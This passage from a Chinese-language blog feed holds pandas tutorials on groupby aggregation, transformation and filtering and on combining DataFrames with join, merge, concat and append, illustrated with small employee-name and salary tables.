class="line">by_len=people.groupby(len)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/groupby%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E5%88%86%E7%BB%84.png" alt="by_len"></p><p>可以看到将姓名长度相同的3分成一组，长度为5的数据分成了一组<br>更加通用的是可以自定义函数进行分组，如要将索引&gt;5的和小于5的分别分组，可以自定义函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#数据集</span></span><br><span class="line">df=pd.DataFrame(&#123;<span class="string">'key'</span>:[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>],</span><br><span class="line">                 <span class="string">'data'</span>:[<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">20</span>]&#125;,</span><br><span class="line">                index=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>])</span><br><span class="line">df</span><br><span class="line"><span class="comment">#自定义函数区分大于5和小于5的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">big5</span><span class="params">(x)</span>:</span>  </span><br><span class="line">    result=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;<span class="number">5</span>:</span><br><span class="line">        result=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">by_big5=df.groupby(big5)  <span class="comment">#根据索引是否大于5进行分组</span></span><br><span class="line"><span class="comment">#查看分组情况</span></span><br><span class="line"><span class="keyword">for</span> group_name,group_data <span class="keyword">in</span> by_big5:</span><br><span class="line">    print(group_name)</span><br><span class="line">    print(group_data)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/groupby%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E5%88%86%E7%BB%84.png" alt="自定义函数分组"></p><h1 id="二、对分组后的数据进行应用"><a href="#二、对分组后的数据进行应用" class="headerlink" title="二、对分组后的数据进行应用"></a>二、对分组后的数据进行应用</h1><p>前面通过分组将数据集根据条件分组后，可以对分组后的数据进行各种处理包括聚合、转换、过滤等操作。</p><h2 id="1、对分组数据用聚合函数进行聚合"><a href="#1、对分组数据用聚合函数进行聚合" class="headerlink" title="1、对分组数据用聚合函数进行聚合"></a>1、对分组数据用聚合函数进行聚合</h2><h3 id="a-使用pandas聚合函数"><a href="#a-使用pandas聚合函数" class="headerlink" title="a) 使用pandas聚合函数"></a>a) 使用pandas聚合函数</h3><p>前面第一部分的例子中对数据分组后进行了sum()求和聚合操作，类似的聚合函数还有很多如：</p><table><thead><tr><th>函数名</th><th>描述</th></tr></thead><tbody><tr><td>count</td><td>分组中非NA值的数量</td></tr><tr><td>sum</td><td>非NA值的和</td></tr><tr><td>mean</td><td>非NA值的平均值</td></tr><tr><td>median</td><td>非NA值的中位数</td></tr><tr><td>std, var</td><td>标准差和方差</td></tr><tr><td>min, max</td><td>非NA的最小值，最大值</td></tr><tr><td>prod</td><td>非NA值的乘积</td></tr><tr><td>first, last</td><td>非NA值的第一个,最后一个</td></tr></tbody></table><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0.png" alt="聚合函数"></p><h3 id="b-使用自定义聚合函数"><a href="#b-使用自定义聚合函数" class="headerlink" title="b) 使用自定义聚合函数"></a>b) 使用自定义聚合函数</h3><p>pandas的groupby分组对象还可以用自定义的聚合函数可以通过groupby分组对象，将你自己的聚合函数，传入aggregate或agg方法即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df=pd.DataFrame(&#123;<span class="string">'key'</span>:[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>],<span class="string">'data'</span>:[<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">20</span>]&#125;)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E8%81%9A%E5%90%88%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="数据集"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grouped=df.groupby([<span class="string">'key'</span>])</span><br><span class="line"><span class="comment">#查看分组情况</span></span><br><span class="line"><span class="keyword">for</span> group_name,group_data <span class="keyword">in</span> grouped:</span><br><span class="line">    print(group_name)</span><br><span class="line">    print(group_data)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E8%81%9A%E5%90%88%E6%95%B0%E6%8D%AE%E9%9B%86%E6%9F%A5%E7%9C%8B%E5%88%86%E7%BB%84%E6%83%85%E5%86%B5.png" alt="分组情况"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peak_to_peak</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> arr.max() - arr.min()</span><br><span class="line"></span><br><span class="line">grouped.agg(peak_to_peak)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E5%88%86%E7%BB%84.png" alt="自定义函数分组"></p><h2 id="2、根据分组数据进行转换"><a href="#2、根据分组数据进行转换" class="headerlink" title="2、根据分组数据进行转换"></a>2、根据分组数据进行转换</h2><p>根据分组数据进行数据转换或其他操作，可以在分组的基础上用apply函数进行数据的转换。<br>如数据集</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">df=pd.DataFrame(&#123;<span class="string">'key'</span>:[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>],</span><br><span class="line">                 <span class="string">'data'</span>:[<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">20</span>]&#125;)</span><br><span class="line">df</span><br><span class="line">根据key分组</span><br><span class="line">grouped=df.groupby([<span class="string">'key'</span>])</span><br><span class="line"><span class="comment">#查看分组情况</span></span><br><span class="line"><span class="keyword">for</span> group_name,group_data <span class="keyword">in</span> grouped:</span><br><span class="line">    print(group_name)</span><br><span class="line">    print(group_data)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E6%95%B0%E6%8D%AE%E8%BD%AC%E6%8D%A2%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="数据集"></p><p>现在我们要对data求和后小于25的分组数据都加1<br>那么我们可以定义函数，然后再对分数数据进行应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span><span class="params">(df)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> df[:][<span class="string">'data'</span>].sum()&lt;<span class="number">25</span>:</span><br><span class="line">        <span class="keyword">return</span> df[:][[<span class="string">'data'</span>]]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> df[:][[<span class="string">'data'</span>]]</span><br><span class="line">grouped.apply(add1)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E6%95%B0%E6%8D%AE%E8%BD%AC%E6%8D%A2.png" alt="数据转换"></p><h2 id="3、根据分组数据进行过滤"><a href="#3、根据分组数据进行过滤" class="headerlink" title="3、根据分组数据进行过滤"></a>3、根据分组数据进行过滤</h2><p>通过 filter() 函数可以实现数据的筛选，该函数根据定义的条件过滤数据并返回一个新的数据集。<br>如当我们要过滤掉分组后data求和小于25的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#过滤掉sum()求和小于25的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filtersum25</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x[<span class="string">'data'</span>].sum()&gt;<span class="number">25</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">grouped.filter(filtersum25)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4.png" alt="数据过滤"></p><p>至此，本文通过实例介绍了pandas的数据分组及分组后的应用如对数据进行聚合、转换和过滤。数据的分组和聚合是数据分析中常用的分析手段，转换和过滤是数据处理中可用到的方法。</p><p>数据集及源代码见：<a href="https://github.com/xiejava1018/pandastest.git" target="_blank" rel="noopener">https://github.com/xiejava1018/pandastest.git</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas数据处理之合并与拼接</title>
      <link href="/posts/e7d4d6e1/"/>
      <url>/posts/e7d4d6e1/</url>
      
        <content type="html"><![CDATA[<p>在许多应用中，数据可能来自不同的渠道，在数据处理的过程中常常需要将这些数据集进行组合合并拼接，形成更加丰富的数据集。pandas提供了多种方法完全可以满足数据处理的常用需求。具体来说包括有join、merge、concat、append等。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/%E5%90%88%E5%B9%B6%E4%B8%8E%E8%BF%9E%E6%8E%A5.png" alt="合并与拼接"></p><p>一般来说</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>join</td><td>最简单，主要用于基于索引的横向合并拼接</td></tr><tr><td>merge</td><td>最常用，主要用户基于指定列的横向合并拼接</td></tr><tr><td>concat</td><td>最强大，可用于横向和纵向合并拼接</td></tr><tr><td>append</td><td>主要用于纵向追加</td></tr><tr><td>combine_first</td><td>合并重叠数据，填充缺失值</td></tr><tr><td>update</td><td>将一个数据集的值更新到另一个数据集</td></tr></tbody></table><p>下面就来逐一介绍每个方法</p><h1 id="一、join"><a href="#一、join" class="headerlink" title="一、join"></a>一、join</h1><p>join主要用于基于索引的横向合并拼接<br>在介绍pandas的join之前我们来看一下SQL对数据集join的几种模式。如果大家对SQL比较熟悉的话应该对SQL操作数据集进行各种合并拼接印象深刻。SQL中各种JOIN的方法如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/SQL-JOIN.png" alt="SQL-JOIN"></p><p>pandas的join实现了<strong>left join、right jion、inner join、out jion</strong>常用的4中join方法<br>来自官网的参数说明：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dataframe.join(other,  <span class="comment"># 待合并的另一个数据集</span></span><br><span class="line">                   on=<span class="literal">None</span>,  <span class="comment"># 连接的键</span></span><br><span class="line">                   how=<span class="string">'left'</span>,   <span class="comment"># 连接方式：‘left’, ‘right’, ‘outer’, ‘inner’ 默认是left</span></span><br><span class="line">                   lsuffix=<span class="string">''</span>,  <span class="comment"># 左边（第一个）数据集相同键的后缀</span></span><br><span class="line">                   rsuffix=<span class="string">''</span>,  <span class="comment"># 第二个数据集的键的后缀</span></span><br><span class="line">                   sort=<span class="literal">False</span>)  <span class="comment"># 是否根据连接的键进行排序；默认False</span></span><br></pre></td></tr></table></figure><p>我们来看下实例，有两个数据集一个是人员姓名，一个是人员的工资</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">left=pd.DataFrame([<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>,<span class="string">'赵六'</span>,<span class="string">'钱七'</span>], index=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>],columns=[<span class="string">'姓名'</span>])</span><br><span class="line">right=pd.DataFrame([<span class="number">13000</span>,<span class="number">15000</span>,<span class="number">9000</span>,<span class="number">8600</span>,<span class="number">10000</span>], index=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>],columns=[<span class="string">'工资'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/pandas-join%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="数据集"></p><blockquote><p>注意，left和right的数据集分别都指定了index，因为join主要用于基于索引的横向合并拼接。</p></blockquote><h2 id="1、left-join"><a href="#1、left-join" class="headerlink" title="1、left join"></a>1、left join</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left.join(right)  <span class="comment">#默认how='left'</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/pandas-join(left).png" alt="left join"></p><p>jion操作默认是left jion的操作，可以看到left索引为7姓名为钱七，在right中没有索引为7的对应所以显示left的姓名但right的工资为NaN，right中索引为8的数据在left中没有索引为8的，所以没有显示。left join合并left的数据<br>left join 如下图所示<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/left-join.png" alt="left join"></p><h2 id="2、right-join"><a href="#2、right-join" class="headerlink" title="2、right join"></a>2、right join</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left.join(right,how=<span class="string">'right'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/pandas-join(right).png" alt="right join"></p><p>右链接合并时可以看到，left的数据集没有索引为8的项，所以索引为8的项显示right数据集的工资数据但姓名为NaN，在left中索引为7的项因为right中不存在，所以没有显示。right join合并right的数据<br>right join 如下图所示<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/right-join.png" alt="right join"></p><h2 id="3、inner-join"><a href="#3、inner-join" class="headerlink" title="3、inner join"></a>3、inner join</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left.join(right,how=<span class="string">'inner'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/pandas-join(inner).png" alt="inner join"></p><p>内链接合并时，可以看到left数据集中的索引为7姓名为钱七因为在right数据集中找不到对应的索引，right数据集中索引为8的在left找不到对应的索引所以内连接合并时索引7和8都没有进行合并，inner join只合并两个数据集共有的数据<br>inner join 如下图所示<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/inner-join.png" alt="inner join"></p><h2 id="4、out-join"><a href="#4、out-join" class="headerlink" title="4、out join"></a>4、out join</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left.join(right,how=<span class="string">'outer'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/pandas-join(outer).png" alt="out join"><br>外链接合并时，可以看到不管是left中的数据还是right中的数据都进行了合并。right join合并两个数据集中所有的数据。<br>outer join 如下图所示<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/out-join.png" alt="outer join"><br>join很简单，但是它有局限性，因为它只能根据索引来合并。不能指定键来进行合并。比如我要根据编号和姓名来合并，join就比较难办了。但是pandas提供了merge的方法，可以指定列来进行合并拼接。</p><h1 id="二、merge"><a href="#二、merge" class="headerlink" title="二、merge"></a>二、merge</h1><p>merge最常用，主要用户基于指定列和横向合并拼接，语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pd.merge(left, right, how=<span class="string">'inner'</span>, on=<span class="literal">None</span>, left_on=<span class="literal">None</span>, right_on=<span class="literal">None</span>,</span><br><span class="line">left_index=<span class="literal">False</span>, right_index=<span class="literal">False</span>, sort=<span class="literal">True</span>,suffixes=(<span class="string">'_x'</span>, <span class="string">'_y'</span>), copy=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数名称</th><th>说明</th></tr></thead><tbody><tr><td>left/right</td><td>两个不同的 DataFrame 对象。</td></tr><tr><td>on</td><td>指定用于连接的键（即列标签的名字），该键必须同时存在于左右两个 DataFrame 中，如果没有指定，并且其他参数也未指定， 那么将会以两个 DataFrame 的列名交集做为连接键。</td></tr><tr><td>left_on</td><td>指定左侧 DataFrame 中作连接键的列名。该参数在左、右列标签名不相同，但表达的含义相同时非常有用。</td></tr><tr><td>right_on</td><td>指定左侧 DataFrame 中作连接键的列名。</td></tr><tr><td>left_index</td><td>布尔参数，默认为 False。如果为 True 则使用左侧 DataFrame 的行索引作为连接键，若 DataFrame 具有多层索引(MultiIndex)，则层的数量必须与连接键的数量相等。</td></tr><tr><td>right_index</td><td>布尔参数，默认为 False。如果为 True 则使用左侧 DataFrame 的行索引作为连接键。</td></tr><tr><td>how</td><td>要执行的合并类型，从 {‘left’, ‘right’, ‘outer’, ‘inner’} 中取值，默认为“inner”内连接。</td></tr><tr><td>sort</td><td>布尔值参数，默认为True，它会将合并后的数据进行排序；若设置为 False，则按照 how 给定的参数值进行排序。</td></tr><tr><td>suffixes</td><td>字符串组成的元组。当左右 DataFrame 存在相同列名时，通过该参数可以在相同的列名后附加后缀名，默认为(‘_x’,’_y’)。</td></tr><tr><td>copy</td><td>默认为 True，表示对数据进行复制。</td></tr></tbody></table><p>我们来看下面的数据集，在上面的数据集中left数据集加入了员工的编号，right数据集加入了编号及姓名。索引就按默认的索引。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left=pd.DataFrame([[<span class="number">3</span>,<span class="string">'张三'</span>],[<span class="number">4</span>,<span class="string">'李四'</span>],[<span class="number">5</span>,<span class="string">'王五'</span>],[<span class="number">6</span>,<span class="string">'赵六'</span>],[<span class="number">7</span>,<span class="string">'钱七'</span>]],</span><br><span class="line">columns=[<span class="string">'编号'</span>,<span class="string">'姓名'</span>])</span><br><span class="line"></span><br><span class="line">right=pd.DataFrame([[<span class="number">3</span>,<span class="string">'张三'</span>,<span class="number">13000</span>],[<span class="number">4</span>,<span class="string">'李四'</span>,<span class="number">15000</span>],[<span class="number">5</span>,<span class="string">'王五'</span>,<span class="number">9000</span>],[<span class="number">6</span>,<span class="string">'赵六'</span>,<span class="number">8600</span>],[<span class="number">8</span>,<span class="string">'孙八'</span>,<span class="number">10000</span>]],</span><br><span class="line">columns=[<span class="string">'编号'</span>,<span class="string">'姓名'</span>,<span class="string">'工资'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/merge%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="merge数据集"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd.merge(left,right)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/pandas-merge.png" alt="pd.merge(left,right)"></p><p>没有指定连接键，默认用重叠列名，没有指定连接方式，默认inner内连接（取left和right编号和姓名的交集）<br>和join一样通过how来指定连接方式如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd.merge(left,right,how=<span class="string">'left'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/pandas-merge(left).png" alt="pd.merge(left,right,how=&#39;left&#39;)"></p><p>how的连接方式和join一样支持left、right、inner、outer<br>merge还可以指定多个列进行合并链接，也就是和SQL一样设置多个关联的列。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd.merge(left,right,how=<span class="string">'outer'</span>,on=[<span class="string">'编号'</span>,<span class="string">'姓名'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/pandas-merge(outer).png" alt="merge-out"></p><p>如果两个对象的列名不同，可以使用<code>left_on</code>，<code>right_on</code>分别指定，如我们把right数据集的“编码”列标签改成“ID”后如果需要left数据集的”编号”和right数据集的”ID”进行关联</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">right=pd.DataFrame([[<span class="number">3</span>,<span class="string">'张三'</span>,<span class="number">13000</span>],[<span class="number">4</span>,<span class="string">'李四'</span>,<span class="number">15000</span>],[<span class="number">5</span>,<span class="string">'王五'</span>,<span class="number">9000</span>],[<span class="number">6</span>,<span class="string">'赵六'</span>,<span class="number">8600</span>],[<span class="number">8</span>,<span class="string">'孙八'</span>,<span class="number">10000</span>]],columns=[<span class="string">'ID'</span>,<span class="string">'姓名'</span>,<span class="string">'工资'</span>])</span><br><span class="line"></span><br><span class="line">pd.merge(left,right,how=<span class="string">'outer'</span>,left_on=<span class="string">'编号'</span>,right_on=<span class="string">'ID'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/pandas-merge%E6%8C%87%E5%AE%9A%E5%88%97%E5%90%8D%E5%85%B3%E8%81%94.png" alt="指定列名关联"></p><p>虽然说merge已经很强大了，但是pandas愿意给你更多，它提供了concat，可以实现横向和纵向的合并与拼接。也就是说不但实现了SQL中的join还实现了union</p><h1 id="三、concat"><a href="#三、concat" class="headerlink" title="三、concat"></a>三、concat</h1><p>concat() 函数用于沿某个特定的轴执行连接操作，语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd.concat(objs,axis=<span class="number">0</span>,join=<span class="string">'outer'</span>,join_axes=<span class="literal">None</span>,ignore_index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数名称</th><th>说明</th></tr></thead><tbody><tr><td>objs</td><td>一个序列或者是Series、DataFrame对象。</td></tr><tr><td>axis</td><td>表示在哪个轴方向上（行或者列）进行连接操作，默认 axis=0 表示行方向。</td></tr><tr><td>join</td><td>指定连接方式，取值为{“inner”,”outer”}，默认为 outer 表示取并集，inner代表取交集。</td></tr><tr><td>ignore_index</td><td>布尔值参数，默认为 False，如果为 True，表示不在连接的轴上使用索引。</td></tr><tr><td>join_axes</td><td>表示索引对象的列表。</td></tr></tbody></table><p>来看具体的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left2=pd.DataFrame([[<span class="number">1</span>,<span class="string">'陈一'</span>],[<span class="number">2</span>,<span class="string">'周二'</span>]],columns=[<span class="string">'编号'</span>,<span class="string">'姓名'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/concat%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="数据集"></p><h2 id="1、纵向合并"><a href="#1、纵向合并" class="headerlink" title="1、纵向合并"></a>1、纵向合并</h2><p>concat默认纵向拼接，我们要在left1数据集的基础上把left2数据集给合并上去，很简单用concat直接就可以合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df=pd.concat([left,left2])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/concat%E7%BA%B5%E5%90%91%E5%90%88%E5%B9%B6.png" alt="纵向合并"></p><h2 id="2、横向合并"><a href="#2、横向合并" class="headerlink" title="2、横向合并"></a>2、横向合并</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_outer=pd.concat([left,right],axis=<span class="number">1</span>,join=<span class="string">'outer'</span>)<span class="comment">#外链接</span></span><br><span class="line">df_inner=pd.concat([left,right],axis=<span class="number">1</span>,join=<span class="string">'inner'</span>)<span class="comment">#内链接</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/concat%E6%A8%AA%E5%90%91%E5%90%88%E5%B9%B6.png" alt="横向合并"></p><blockquote><p>注意：因为concat的链接和join一样是通过索引来链接合并，并不能指定通过某个特定的列来链接进行合并，所以看到的合并后的数据集left和right的编号和姓名是错位的。</p></blockquote><p>如果要根据编号来关联可以指定编号作为索引再进行横向合并，这样就没有问题了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">left.index=left[<span class="string">'编号'</span>].values</span><br><span class="line">right.index=right[<span class="string">'编号'</span>].values</span><br><span class="line">df_outer=pd.concat([left,right],axis=<span class="number">1</span>,join=<span class="string">'outer'</span>)</span><br><span class="line">df_inner=pd.concat([left,right],axis=<span class="number">1</span>,join=<span class="string">'inner'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/concat%E6%A8%AA%E5%90%91%E5%90%88%E5%B9%B62.png" alt="横向合并"></p><h1 id="四、append"><a href="#四、append" class="headerlink" title="四、append"></a>四、append</h1><p>df.append 可以将其他行附加到调用方的末尾，并返回一个新对象。它是最简单常用的数据合并方式。语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.append(self, other, ignore_index=<span class="literal">False</span>,verify_integrity=<span class="literal">False</span>, sort=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>other 是它要追加的其他 DataFrame 或者类似序列内容 </li><li>ignore_index 如果为 True 则重新进行自然索引</li><li>verify_integrity 如果为 True 则遇到重复索引内容时报错 </li><li>sort 进行排序</li></ul><p>来看下面的例子：</p><h2 id="1、同结构数据追加"><a href="#1、同结构数据追加" class="headerlink" title="1、同结构数据追加"></a>1、同结构数据追加</h2><p>将同结构的数据追加在原数据后面，在left数据集后面追加left2数据集，left2的数据集内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">left2=pd.DataFrame([[<span class="number">1</span>,<span class="string">'陈一'</span>],[<span class="number">2</span>,<span class="string">'周二'</span>]],columns=[<span class="string">'编号'</span>,<span class="string">'姓名'</span>])</span><br><span class="line">left2</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220210/append%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="append数据集"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 